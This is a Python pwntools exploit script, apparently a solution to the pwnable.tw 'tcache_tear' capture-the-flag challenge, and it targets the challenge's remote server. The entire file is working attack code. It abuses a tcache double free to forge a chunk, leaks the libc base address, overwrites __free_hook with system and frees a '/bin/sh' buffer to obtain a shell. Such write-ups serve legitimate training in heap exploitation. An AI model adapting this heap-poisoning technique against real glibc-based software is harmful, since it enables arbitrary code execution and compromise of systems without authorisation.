#!/usr/bin/env python3

from pwn import *

exe = ELF("./tcache_tear_patched")
libc = ELF("./libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so")
ld = ELF("./ld-2.27.so")

context.binary = exe
#p = process()
p = remote('chall.pwnable.tw', 10207)
#gdb.attach(p,gdbscript='''
#           b*0x0000000000400B54
#           b*0x0000000000400A25
#           b*0x0000000000400C54
#           b*0x0000000000400BBF
#           ''')

def malloc(size,data):
    p.sendlineafter(b'Your choice :',b'1')
    p.sendlineafter(b'Size:',f'{size}'.encode())
    p.sendafter(b'Data:',data)
def free():
    p.sendlineafter(b'Your choice :',b'2')

def show():
    p.sendlineafter(b'Your choice :',b'3')

bss = 0x0000000000602060


p.sendafter(b'Name:',p64(0) + p64(0x501))

malloc(0x50,b'a')
free()
free()
malloc(0x50,p64(bss+0x500))
malloc(0x50,b'a')
malloc(0x50,(p64(0) + p64(0x21) + p64(0) + p64(0))*2)

malloc(0x60,b'a')
free()
free()
malloc(0x60,p64(bss+0x10))
malloc(0x60,b'a')
malloc(0x60,b'a')
free()

# leak success 

show()
p.recvuntil(b'Name :')
p.recv(16)
libc.address = u64(p.recv(6).ljust(8,b'\x00')) - 0x3ebca0
log.success(f'libc address: {hex(libc.address)}')

input()
malloc(0x70,b'a')
free()
free()
malloc(0x70,p64(libc.sym.__free_hook))
malloc(0x70,b'a')
malloc(0x70,p64(libc.sym.system))

malloc(0x70,b'a')
malloc(0x70,b'/bin/sh\x00')
free()



p.interactive()
